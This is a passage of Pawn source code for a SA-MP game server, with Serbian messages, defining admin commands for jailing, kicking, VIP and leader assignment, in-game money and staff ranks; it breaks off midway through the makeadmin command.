CMD:unprisonall( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] >= 7  ) {
        if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
		foreach( Player, i ) {
			if( PlayerInfo[ i ][ xZatvor ] != 0 ) {
				Novi_SetPlayerPos( i, 1798.0217,-1578.1200,14.0855);
			    SetTimerEx( "SlobodnoSada", 6000, false, "i", i );
			   	SetCameraBehindPlayer( i );
			    TogglePlayerControllable( i, false );
			  	SetPlayerInterior( i, 0 );
				SetPlayerVirtualWorld( i, 0 );
			    PlayerInfo[ i ][ xZatvor ] = 0;
				PlayerInfo[ i ][ xZatvorVreme ] = 0;
				SetPlayerWorldBounds( i, 20000.0000, -20000.0000, 20000.0000, -20000.0000 );
			}
		}
	    format( globalstring, sizeof( globalstring ), "UNPRISONALL | %s je unprisonovao sve igrace.", ImeIgraca( playerid ) );
	   	SCMA( NARACRVENA, globalstring );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:kickall( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] >= 7  ) {
        if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
		foreach( Player, i ) {
			if( i != IPI && PlayerInfo[ i ][ xAdmin ] < 6 ) {
				Novi_Kick( i );
			}
		}
	    format( globalstring, sizeof( globalstring ), "KICKALL | %s je kikovao sve igrace.", ImeIgraca( playerid ) );
	   	AdminPoruka( NARACRVENA, globalstring );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:proverarada( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");
	new target;
	if( sscanf( params, "u", target ) ) {
		SendUsageMessage( playerid, "/proverarada [ ID/Deo Imena ]");
		return 1;
	}
	if( target == IPI ) return SendErrorMessage( playerid, "Pogresan ID." );
	ShowAdminStats( playerid, target );
    return 1;
}

CMD:id( playerid, params[] ) {
    new target;
	if( sscanf( params, "u", target ) ) {
		SendUsageMessage( playerid, "/id [ ID/Deo Imena ]");
		return 1;
	}
	if( IsPlayerConnected( target ) ) {
 		if( target != INVALID_PLAYER_ID ) {
 		    new name[ MAX_PLAYER_NAME ];
			GetPlayerName( target, name, sizeof( name ) );
			format( globalstring, sizeof( globalstring ), "ID: (%d) %s", target, name );
			SendClientMessage( playerid, BELA, globalstring );
		}
	}
    return 1;
}

CMD:dopustipromenuimena( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");
    if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );

	new id;
	if( sscanf( params, "u", id ) ) return SendUsageMessage( playerid, "/dopustipromenuimena [ ID/Deo Imena ]");
	if( id == IPI ) return SendErrorMessage( playerid, "Pogresan ID igraca." );

	SetPVarInt( id, "PlayerCanChangeName", 1 );
	SendClientMessageEx( playerid, SVETLOPLAVA, "Dozvolili ste igracu %s promenu imena!", ImeIgraca( id ) );
	SendClientMessageEx( id, SVETLOPLAVA, "Admin %s vam je dozvolio promenu imena(/changename)!", ImeIgraca( playerid ) );

	return 1;
}

alias:makeleader("postavilidera");
CMD:makeleader( playerid, params[] ) {

    if( PlayerInfo[ playerid ][ xAdmin ] > 5 || PlayerInfo[ playerid ][ xSkriptaRank ] == 4  ) {

	    if( PlayerInfo[ playerid ][ xAdmin ] > 5 ) { if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" ); }
		new id, kolicina;
	    if( sscanf( params, "ui", id, kolicina ) ) {
			SendUsageMessage( playerid, "/makeleader [ ID/Deo imena ][ ID ORGE ]" );
			SCM( playerid, BELA, "Listu orgi gledate komandom /server." );
			return 1;
		}
		new ImaFajl[40];
	    format( ImaFajl, sizeof( ImaFajl ), O_FILE, kolicina );
		if( id == IPI ) return SendErrorMessage( playerid, "Taj igrac nije na serveru.");
	    if( kolicina == 0) {
			if( PlayerInfo[ id ][ xLider ] == 0 ) return SendErrorMessage( playerid, "Taj igrac nije lider nijedne organizacije" );
			new OrgID = PlayerInfo[ id ][ xLider ];

			if( strcmp( ImeIgraca( id ), OI[ OrgID ][ oLider1 ], true ) == 0) { strmid( OI[ OrgID ][ oLider1 ], "Niko", 0, strlen( "Niko" ), ORG_LIDER); }
			else if( strcmp( ImeIgraca( id ), OI[ OrgID ][ oLider2 ], true ) == 0) { strmid( OI[ OrgID ][ oLider2 ], "Niko", 0, strlen( "Niko" ), ORG_LIDER ); }

			PlayerInfo[ id ][ xLider ] = 0;
			PlayerInfo[ id ][ xRank ] = 0;
			PlayerInfo[ id ][ xClan ] = 0;
			PlayerInfo[ id ][ xOrgUgovor ] = 0;
			PlayerInfo[ id ][ xSkin ] = SetSexSkin( id );
			PlayerInfo[ id ][ xSpawn ] = SetRandomSpawn(  );
			PostaviSkin( id, SetSexSkin( id ) );
			
            PoliceDuty[ id ] = false;
            ResetAllWeapons( id );
            BrojLisica[ id ] = 0;
            Novi_SetPlayerArmour( id, 0 );
            Novi_SetPlayerHealth( id, 75 );
            SetPlayerColor( id, 0xFFFFFF00 );

			SaveOrganization( OrgID );

			SendClientMessageEx( id, SVETLOPLAVA, "Admin %s vam je skinuo lidera.",ImeIgraca( playerid ) );
			SendClientMessageEx( playerid, SVETLOPLAVA, "Skinuli ste igracu: %s lidera organizacije.",ImeIgraca( id ) );
			SavePlayer( id );

			format( globalstring, sizeof( globalstring ), "MAKE | %s je skinuo lidera igracu %s.", ImeIgraca( playerid ), ImeIgraca( id ) );
		   	AdminPoruka( NARACRVENA, globalstring );
		}
		else {
			if( PlayerInfo[ id ][ xClan ] != 0 ) return SendErrorMessage( playerid, "Taj igrac je vec clan neke organizacije" );
			if( PlayerInfo[ id ][ xLider ] != 0 ) return SendErrorMessage( playerid, "Taj igrac je vec clan neke organizacije" );
		    if( !fexist( ImaFajl ) ) return SendErrorMessage( playerid, "Ta organizacija ne postoji." );

	        if( !strcmp( OI[ kolicina ][ oLider1 ], "Niko", true ) ) { strmid( OI[ kolicina ][ oLider1 ], ImeIgraca( id ), 0, strlen( ImeIgraca( id ) ), ORG_LIDER  ); }
	   		else if( !strcmp( OI[ kolicina ][ oLider2 ], "Niko", true ) ) { strmid( OI[ kolicina ][ oLider2 ], ImeIgraca( id ), 0, strlen( ImeIgraca( id ) ), ORG_LIDER  ); }
	   		else return SendErrorMessage( playerid, "Ova organizacija vec ima 2 lidera." );

			PlayerInfo[ id ][ xLider ] = kolicina;
			PlayerInfo[ id ][ xClan ] = kolicina;
			PlayerInfo[ id ][ xOrgUgovor ] = 0;
			PlayerInfo[ id ][ xSpawn ] = SPAWN_BAZA;
			PlayerInfo[ id ][ xRank ] = 6;

			if( PlayerInfo[ id ][ xPol ] == 1 ) {
				PlayerInfo[ id ][ xSkin ] = OI[ kolicina ][ oSkin6 ]; PostaviSkin( id, OI[ kolicina ][ oSkin6 ] );
				
			}
			else if( PlayerInfo[ id ][ xPol ] == 2 ) {
				PlayerInfo[ id ][ xSkin ] = OI[ kolicina ][ oZSkin6 ]; PostaviSkin( id, OI[ kolicina ][ oZSkin6 ] );
				
			}

	        SaveOrganization( kolicina );
			SendClientMessageEx( id, SVETLOPLAVA, "Admin %s vam je postavio lidera organizacije/bande/mafije %s.",ImeIgraca( playerid ), OI[ kolicina ][ oName ] );
			SendClientMessageEx( playerid, SVETLOPLAVA, "Postavili ste igracu: %s lidera organizacije/bande/mafije %s.",ImeIgraca( id ), OI[ kolicina ][ oName ] );
			SavePlayer( id );

			format( globalstring, sizeof( globalstring ), "MAKE | %s je dao lidera %s igracu %s.", ImeIgraca( playerid ), OI[ kolicina ][ oName ], ImeIgraca( id ) );
		   	AdminPoruka( NARACRVENA, globalstring );
		}
	} else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");
	return true;
}

// CMD:pport( playerid, params[] ) {

//     if( PlayerInfo[ playerid ][ xAdmin ] >= 6 || PlayerInfo[ playerid ][ xPromoter ] >= 1 ) {
    
//         if( PlayerInfo[ playerid ][ xPromoter ] >= 1 ) {
        
//             if( NaUtrci[ playerid ] ) return SendErrorMessage( playerid, "Ne mozes dok si na trci." );
//             if( NaDmEventu[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes koristiti ovu komandu dok si u DM Zoni." );
//             if( PoliceDuty[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok si na duznosti." );
//             if( UzeoOpremu[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok radis posao ili imas uniformu posla." );
// 			if( PlayerInfo[ playerid ][ xWanted ] != 0 ) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok imas wanted level." );
// 			if( PlayerInfo[ playerid ][ xZatvor ] != 0 ) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok si u jailu." );
// 		}
//         if( PromoterPort[ playerid ] != 0 ) return SendErrorMessage( playerid, "Jos %d sekundi do sledeceg porta.", PromoterPort[ playerid ] );

// 		SPD( playerid, dialog_SELECTPPORT, DSL, D_NASLOV, "Promoter baza\nBanka\nBurg\nOpstina", D_ODABERI, D_ODUSTANI );
// 	}
// 	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
//     return true;
// }

// CMD:vport( playerid, params[] ) { 
//     if( PlayerInfo[ playerid ][ xAdmin ] >= 6 || PlayerInfo[ playerid ][ xVIPLevel ] >= 1 ) {
//         if( PlayerInfo[ playerid ][ xVIPLevel ] >= 1 ) {
//             if( NaUtrci[ playerid ] ) return SendErrorMessage( playerid, "Ne mozes dok si na trci." );
//             if( NaDmEventu[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes koristiti ovu komandu dok si u DM Zoni." );
//             if( PoliceDuty[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok si na duznosti." );
//             if( UzeoOpremu[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok radis posao ili imas uniformu posla." );
// 			if( PlayerInfo[ playerid ][ xWanted ] != 0 ) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok imas wanted level." );
// 			if( PlayerInfo[ playerid ][ xZatvor ] != 0 ) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok si u jailu." );
//             if( RadiVojnik{playerid}) return SendErrorMessage( playerid, "Ne mozes to dok radis posao!");
//             if( RadiSabotazer{playerid}) return SendErrorMessage( playerid, "Ne mozes to dok radis posao!");
//             if(GetPlayerVehicleID(playerid) == KombiHangar) return SendErrorMessage(playerid, "Ne mozes to sa ovim vozilom!");
// 		}
//         if( VIPPort[ playerid ] != 0 ) return SendErrorMessage( playerid, "Jos %d sekundi do sledeceg porta.", VIPPort[ playerid ] );

//         strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
//         for( new i = 0; i < MAX_APORTS; i++ ) {
//             if( aportInfo[ i ][ aportCreated ] == 1 ) {
//                 format( DialogStrgEx, sizeof( DialogStrgEx ), "%s%s\n", DialogStrgEx, aportInfo[ i ][ aportName ] );
//             }
//         }
//         SPD( playerid, dialog_SELECTAPORT, DSL, D_NASLOV, DialogStrgEx, D_ODABERI, D_ODUSTANI );

// 	}
// 	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
//     return true;
// }

CMD:tunecar( playerid, params[] ) {
	if( PlayerInfo[ playerid ][ xAdmin ] >= 6 || PlayerInfo[ playerid ][ xVIPLevel ] >= 5 ) {
	    if( PlayerInfo[ playerid ][ xVIPLevel ] >= 5 ) { if( PlayerInfo[ playerid ][ xWanted ] != 0 ) return SendErrorMessage( playerid, "Ne mozes fixati vozilo dok imas wanted level." ); }
        if( PlayerCP[ playerid ] > 0 ) return SendErrorMessage( playerid, "Ne mozes dok si na eventu." );
	    PlayerTuningCar[ playerid ] = true;
	    TuningTDControl( playerid, true );
		SPD( playerid, dialog_TUNING, DSL, D_NASLOV, "Paintjobs\nColors\nExhausts\nFront Bumper\nRear Bumper\nRoof\nSpoilers\nSide Skirts\nWheels\nCar Stereo\nHydraulics\nNitro", D_ODABERI, D_ODUSTANI );
    }
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return true;
}

alias:viphelp("vipinfo");
CMD:viphelp( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] >= 6 || PlayerInfo[ playerid ][ xVIPLevel ] >= 1 ) {
        strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
        
        strcat( DialogStrgEx, ""col_crvena"__________________________"col_white"__________________________\n");
       	strcat( DialogStrgEx, ""col_crvena"VIP 1 | "col_white" /port(120s) /g(20s) /fv(180s) /vpveh\n");
        if( PlayerInfo[ playerid ][ xVIPLevel ] >= 2 || PlayerInfo[ playerid ][ xAdmin ] >= 6 ) {
            strcat( DialogStrgEx, ""col_crvena"__________________________"col_white"__________________________\n");
        	strcat( DialogStrgEx, ""col_crvena"VIP 2 | "col_white" /port(60s) /g(15s) /fv(120s) /vpveh\n");
        }
        if( PlayerInfo[ playerid ][ xVIPLevel ] >= 3 || PlayerInfo[ playerid ][ xAdmin ] >= 6 ) {
            strcat( DialogStrgEx, ""col_crvena"__________________________"col_white"__________________________\n");
        	strcat( DialogStrgEx, ""col_crvena"VIP 3 | "col_white" /port(60s) /g(10s) /fv(80s) /goto(60s) /vpveh\n");
		}
        if( PlayerInfo[ playerid ][ xVIPLevel ] >= 4 || PlayerInfo[ playerid ][ xAdmin ] >= 6 ) {
            strcat( DialogStrgEx, ""col_crvena"__________________________"col_white"__________________________\n");
        	strcat( DialogStrgEx, ""col_crvena"VIP 4 | "col_white" /port(60s) /g(7s) /vipmenu(120s) /fv(60s) /goto /vpveh\n");
		}
        if( PlayerInfo[ playerid ][ xVIPLevel ] >= 5 || PlayerInfo[ playerid ][ xAdmin ] >= 6 ) {
            strcat( DialogStrgEx, ""col_crvena"__________________________"col_white"__________________________\n");
        	strcat( DialogStrgEx, ""col_crvena"VIP 5 | "col_white" /port(45s) /g(5s) /vipmenu(80s) /fv(30s) /goto /tunecar /vpveh\n");
		}
		if(PlayerInfo[playerid][xVIPLevel] >= 6 || PlayerInfo[playerid][xAdmin] >= 6) {
			strcat( DialogStrgEx, ""col_crvena"__________________________"col_white"__________________________\n");
        	strcat( DialogStrgEx, ""col_crvena"VIP 6 | "col_white" /port(30s) /g(2s) /vipmenu(50s) /fv(10s) /goto\n");
        	strcat( DialogStrgEx, ""col_crvena"VIP 6 | "col_white" /vipboja /vipgotoimovina /vpveh /vipfuel(5min)\n");
		}
        strcat( DialogStrgEx, ""col_crvena"__________________________"col_white"__________________________\n");

		SPD( playerid, dialog_HELP, DSMSG, ""col_crvena"VIP Komande", DialogStrgEx, "Potvrdi", "" );
    	strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
    }
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    return true;
}

CMD:vipmenu( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] >= 6 || PlayerInfo[ playerid ][ xVIPLevel ] >= 4 ) {
        if( PlayerInfo[ playerid ][ xVIPLevel ] >= 4 ) {
            if( VipMenuTime[playerid] != 0) return SendErrorMessage(playerid, "Sacekaj malo!");
            if( NaDmEventu[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes dok si u DM Zoni." );
			if( NaUtrci[ playerid ] ) return SendErrorMessage( playerid, "Ne mozes dok si na trci." );
			if( IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Ne mozes iz auta." );
			if( PlayerInfo[ playerid ][ xWanted ] != 0 ) return SendErrorMessage( playerid, "Ne mozes da uzmes oruzje dok imas wanted level." );
			if( PlayerInfo[ playerid ][ xZatvor ] != 0 ) return SendErrorMessage( playerid, "Ne mozes da uzmes oruzje dok si u zatvoru." );
		}
		SPD( playerid, dialog_SELECTVGUN, DSL, D_NASLOV, "Shotgun [9.500$]\nPalica [1.000$]\nCvece [1.000$]\nDeagle [7.000$]\n9mm Pistol [4.000$]\nUzi [9.000$]\nMP5 [9.500$]\nM4 [11.000$]\nAK47[11.500$]\nPancir [12.000$]\nSniper [20.000$]", D_ODABERI, D_ODUSTANI );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    return true;
}

alias:makevip("postavivipa");
CMD:makevip( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");
    if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );

	new id, kolicina, sati;
    if( sscanf( params, "uii", id, kolicina, sati ) ) {
		SendUsageMessage( playerid, "/makevip [ ID/Deo imena ][ Level VIPA ][Vreme sati]");
		return 1;
	}
	if( id == IPI ) return SendErrorMessage( playerid, "Taj igrac nije na serveru.");
    if(PlayerInfo[id][xAdmin] >= 1 && kolicina != 0) return SendErrorMessage(playerid, "Ne mozes to adminu!");
    if(PlayerInfo[id][xSpecAdmin] >= 1 && kolicina != 0) return SendErrorMessage(playerid, "Ne mozes to spec adminu!");
    if(PlayerInfo[id][xPromoter] >= 1 && kolicina != 0) return SendErrorMessage(playerid, "Ne mozes to promoteru!");
    if(PlayerInfo[id][xSupporter] >= 1 && kolicina != 0) return SendErrorMessage(playerid, "Ne mozes to helperu!");
	if( kolicina == 0 ) {
 		PlayerInfo[ id ][ xVIPLevel ] = 0; 
        PlayerInfo[ id ][ xVIPVreme ] = 0;
 		SetPlayerColor( id, 0xFFFFFF00 );
 		SavePlayer( id );
		SendClientMessageEx( id, SVETLOPLAVA, " Administrator %s vam je skinuo vip status.", ImeIgraca( playerid ) );
		SendClientMessageEx( playerid, SVETLOPLAVA, " Skinuli ste igracu: %s vip status.", ImeIgraca( id ) );
		new string[ 128 ]; 
		format( string, sizeof( string ), "Admin %s | Igrac: %s | Level vipa: %d", ImeIgraca( playerid ), ImeIgraca( id ), kolicina );
		LogSave( "Ostalo/LogMakeVIP.log", string );
	}
	else if( kolicina == 1 || kolicina == 2 || kolicina == 3 || kolicina == 4 || kolicina == 5 || kolicina == 6) {

        if(sati < 1 || sati > 720) return SendErrorMessage(playerid, "Ne mozes manje od 1 ili vise od 720 sati!");

		PlayerInfo[ id ][ xVIPLevel ] = kolicina; 
        PlayerInfo[ id ][ xVIPVreme ] = sati * 60;
		SavePlayer( id );
		SendClientMessageEx( id, SVETLOPLAVA, "Administrator %s vam je postavio vip status(level: %d) na %d sati.",ImeIgraca( playerid ) , kolicina, sati );
		SendClientMessageEx( playerid, SVETLOPLAVA, "Postavili ste igracu: %s vip status(level: %d) na %d sati.",ImeIgraca( id ) , kolicina, sati );
        new string[ 128 ]; 
		format( string, sizeof( string ), "Admin %s | Igrac: %s | Level vipa: %d | Vreme: %d sati", ImeIgraca( playerid ), ImeIgraca( id ), kolicina, sati );
		LogSave( "Ostalo/LogMakeVIP.log", string );
	}
	else return SendErrorMessage( playerid, "Pogresan level vipa.( 0, 1, 2, 3, 4, 5, 6)" );
	return 1;
}

CMD:donatorslot( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");

	new id;
    if( sscanf( params, "u", id ) ) {
		SendUsageMessage( playerid, "/donatorslot [ ID/Deo imena ]");
		return 1;
	}
	if( id == IPI ) return SendErrorMessage( playerid, "Taj igrac nije na serveru.");
	
	if( PlayerInfo[ playerid ][ xDonatorSlot ] == true ) {
	    SendClientMessageEx( id, SVETLOPLAVA, "Admin %s vam je skinuo dozvolu za 4ti slot vozila %d$.", ImeIgraca( playerid ) );
		SendClientMessageEx( playerid, SVETLOPLAVA, "Skinuli ste dozvolu igracu %s za 4ti slot vozila.", ImeIgraca( id ) );
        PlayerInfo[ playerid ][ xDonatorSlot ] = false;
        SavePlayer( playerid );
	}
	else if( PlayerInfo[ playerid ][ xDonatorSlot ] == false ) {
		SendClientMessageEx( id, SVETLOPLAVA, "Admin %s vam je dozvolio 4ti slot vozila %d$.", ImeIgraca( playerid ) );
		SendClientMessageEx( playerid, SVETLOPLAVA, "Dozvolili ste igracu %s 4ti slot vozila.", ImeIgraca( id ) );
        PlayerInfo[ playerid ][ xDonatorSlot ] = true;
        SavePlayer( playerid );
	}
	return 1;
}

alias:givemoney("dajnovac");
CMD:givemoney( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");
    
	new id, kolicina;
    if( sscanf( params, "ui", id, kolicina ) ) {
		SendUsageMessage( playerid, "/givemoney [ ID/Deo imena ][ novac ]");
		return 1;
	}
	if( id == IPI ) return SendErrorMessage( playerid, "Taj igrac nije na serveru.");
    if(kolicina < 1 || kolicina > 5000000) return SendErrorMessage(playerid, "Ne mozes manje od 1 ili vise od 5.000.000$!");
	DajIgracuNovac( id, kolicina );
	SendClientMessageEx( id, SVETLOPLAVA, "Admin %s vam je dao %d$.",ImeIgraca( playerid ), kolicina );
	SendClientMessageEx( playerid, SVETLOPLAVA, "Dali ste igracu: %s %d$.",ImeIgraca( id ), kolicina );

    new string1[ 128 ];
	format( string1, sizeof( string1 ), "Admin %s je dao %d$ igracu %s.", ImeIgraca( playerid ), kolicina, ImeIgraca( id ) );
	LogSave( "Ostalo/LogGiveMoneyAdmin.log", string1 );

	return 1;
}

CMD:resetujnovacruka(playerid, params[]) {

    if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");
    
    new id;
    if( sscanf( params, "u", id ) ) {
        SendUsageMessage( playerid, "/resetujnovacruka [ ID/Deo imena ]");
        return 1;
    }
    if( id == IPI ) return SendErrorMessage( playerid, "Taj igrac nije na serveru.");
    new novac = GetPlayerMoney(id);
    DajIgracuNovacSpeech(id, -novac);
    SendClientMessageEx( id, SVETLOPLAVA, "Admin %s vam je resetovao novac u ruci",ImeIgraca( playerid ));
    SendClientMessageEx( playerid, SVETLOPLAVA, "Resetovao si novac u ruci igracu %s.",ImeIgraca( id ));

    new string1[ 128 ];
    format( string1, sizeof( string1 ), "Admin %s je resetovao novac u ruci igracu %s", ImeIgraca( playerid ), ImeIgraca( id ) );
    LogSave( "Ostalo/LogResetNovacRuka.log", string1 );

    return 1;
}

CMD:resetujnovacbanka(playerid, params[]) {

    if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");
    
    new id;
    if( sscanf( params, "u", id ) ) {
        SendUsageMessage( playerid, "/resetujnovacbanka [ ID/Deo imena ]");
        return 1;
    }
    if( id == IPI ) return SendErrorMessage( playerid, "Taj igrac nije na serveru.");
    PlayerInfo[id][xBRacun] -= PlayerInfo[id][xBRacun];
    SavePlayer(id);
    UpdateBankTD(id);
    SendClientMessageEx( id, SVETLOPLAVA, "Admin %s vam je resetovao novac u banci",ImeIgraca( playerid ));
    SendClientMessageEx( playerid, SVETLOPLAVA, "Resetovao si novac u banci igracu %s.",ImeIgraca( id ));

    new string1[ 128 ];
    format( string1, sizeof( string1 ), "Admin %s je resetovao novac u banci igracu %s", ImeIgraca( playerid ), ImeIgraca( id ) );
    LogSave( "Ostalo/LogResetNovacBanka.log", string1 );

    return 1;
}

CMD:skiniadmina( playerid, params[] ) {
	if( PlayerInfo[ playerid ][ xAdmin ] < 1 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");

	ResetujAdmina( playerid );
	SacuvajAdmina( playerid );

	SetPlayerColor( playerid, 0xFFFFFF00 );
	PlayerInfo[ playerid ][ xAdmin ] = 0;
    PlayerInfo[ playerid ][ xSkin ] = SetSexSkin( playerid );
	PlayerInfo[ playerid ][ xSpawn ] = SetRandomSpawn(  );
	PostaviSkin( playerid, SetSexSkin( playerid ) );
	
	SavePlayer( playerid );

	Novi_SetPlayerArmour( playerid, 0 );
	AdminDuty[ playerid ] = false;
	
	SendInfoMessage( playerid, "Skinuo si sam sebi Admin poziciju." );
	
	format( globalstring, sizeof( globalstring ), "AdminOFF | %s je skinuo sam sebi Admin poziciju.", ImeIgraca( playerid ) );
	AdminPoruka( NARACRVENA, globalstring );
	return 1;
}

alias:givearank("postaviadminrank");
CMD:givearank( playerid, params[] ) {

    if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");
    if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
	//if( !IsPlayerAdmin( playerid ) ) return SendErrorMessage( playerid, "Moras biti rcon admin." );
	new id, kolicina;
    if( sscanf( params, "ui", id, kolicina ) ) {
		SendUsageMessage( playerid, "/givearank [ ID/Deo imena ][ RANK ]");
		SCM( playerid, BELA, "1 - DEVELOPER | 2 - CO DEVELOPER | 3 - MAPPER" );
		SCM( playerid, BELA, "4 - VODJA LIDERA | 5 - VODJA PROMOTERA | 6 - SUVLASNIK" );
        SCM( playerid, BELA, "7 - VODJA HELPERA");
		return 1;
	}
	if( id == IPI ) return SendErrorMessage( playerid, "Taj igrac nije na serveru.");
	if( kolicina < 0 || kolicina > 7 ) return SendErrorMessage( playerid, "Pogresan broj ranka( 0 do 6 )." );

	PlayerInfo[ id ][ xSkriptaRank ] = kolicina;
	SavePlayer( id );
	SendInfoMessage( playerid, "Postavili ste rank igracu %s.", ImeIgraca( id ) );
	SendInfoMessage( id, "%s vam je postavio rank.", ImeIgraca( playerid ) );
	
    return 1;
}
CMD:makespecadmin(playerid, params[])
{
	if(PlayerInfo[playerid][xAdmin] >= 5)
	{
		if(!AdminDuty[playerid]) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
		new id, level;
		if(sscanf(params, "ui", id, level)) return SendUsageMessage(playerid, "/makespecadmin [ID] [LEVEL/0-1]");
		if( id == IPI ) return SendErrorMessage( playerid, "Taj igrac nije na serveru.");
        if(PlayerInfo[id][xAdmin] >= 1 && level != 0) return SendErrorMessage(playerid, "Ne mozes to adminu!");
        if(PlayerInfo[id][xLider] >= 1 && level != 0) return SendErrorMessage(playerid, "Ne mozes to lideru!");
        if(PlayerInfo[id][xPromoter] >= 1 && level != 0) return SendErrorMessage(playerid, "Ne mozes to promoteru!");
        if(PlayerInfo[id][xSupporter] >= 1 && level != 0) return SendErrorMessage(playerid, "Ne mozes to helperu!");
		if( level == 0 ) {
		
		    SetPlayerColor( id, 0xFFFFFF00 );
	 		PlayerInfo[ id ][ xSpecAdmin ] = 0; SavePlayer( id );
			SendClientMessageEx( id, SVETLOPLAVA, " Admin %s vam je skinuo spec admin poziciju.", ImeIgraca( playerid ) );
			SendClientMessageEx( playerid, SVETLOPLAVA, " Skinuli ste igracu: %s spec admin poziciju.", ImeIgraca( id ) );

	        format( globalstring, sizeof( globalstring ), "MAKE | %s je skinuo spec admin poziciju igracu %s.", ImeIgraca( playerid ), ImeIgraca( id ) );
		   	AdminPoruka( NARACRVENA, globalstring );
		}
		else if( level == 1 ) {
		
			PlayerInfo[ id ][ xSpecAdmin ] = 1; SavePlayer( id );
			SendClientMessageEx( id, SVETLOPLAVA, "Admin %s vam je postavio spec admin poziciju.",ImeIgraca( playerid ) );
			SendClientMessageEx( playerid, SVETLOPLAVA, "Postavili ste igracu: %s spec admin poziciju",ImeIgraca( id ) );

	        format( globalstring, sizeof( globalstring ), "MAKE | %s je dao spec admin poziciju igracu %s.", ImeIgraca( playerid ), ImeIgraca( id ) );
		   	AdminPoruka( NARACRVENA, globalstring );
		}
		else return SendErrorMessage( playerid, "Pogresan level spec admina.( 0 - 1 )" );
	}
	return 1;
}

alias:makeadmin("postaviadmina");
CMD:makeadmin( playerid, params[] ) {

    if( PlayerInfo[ playerid ][ xAdmin ] == 7 || PlayerInfo[ playerid ][ xSkriptaRank ] == 6 || IsPlayerAdmin(playerid) ) {

		new id, kolicina;
	    if( sscanf( params, "ui", id, kolicina ) ) {
			SendUsageMessage( playerid, "/makeadmin [ ID/Deo imena ][ Level Admin-a ]");
			return 1;
		}
		if( id == IPI ) return SendErrorMessage( playerid, "Taj igrac nije na serveru.");
		if( PlayerInfo[id][xVIPLevel] >= 1 && kolicina != 0) return SendErrorMessage(playerid, "Ne mozes dati admina VIP-u!");
		if( PlayerInfo[id][xSupporter] >= 1 && kolicina != 0) return SendErrorMessage(playerid, "Ne mozes dati admina Supporteru!");
		if( PlayerInfo[id][xSpecAdmin] >= 1 && kolicina != 0) return SendErrorMessage(playerid, "Ne mozes dati admina Spec Adminu!");
        if( PlayerInfo[id][xLider] >= 1 && kolicina != 0) return SendErrorMessage(playerid, "Ne mozes dati admina lideru!");
        if( PlayerInfo[id][xPromoter] >= 1 && kolicina != 0) return SendErrorMessage(playerid, "Ne mozes dati admina promoteru!");

		if( kolicina == 0) {

	        ResetujAdmina( id );
			SacuvajAdmina( id );

	        SetPlayerColor( id, 0xFFFFFF00 );
			PlayerInfo[ id ][ xAdmin ] = 0;
            PlayerInfo[ id ][ xAdminDuty ] = 0;
            PlayerInfo[ id ][ xAdminWarn ] = 0;
	        PlayerInfo[ id ][ xSkin ] = SetSexSkin( id );
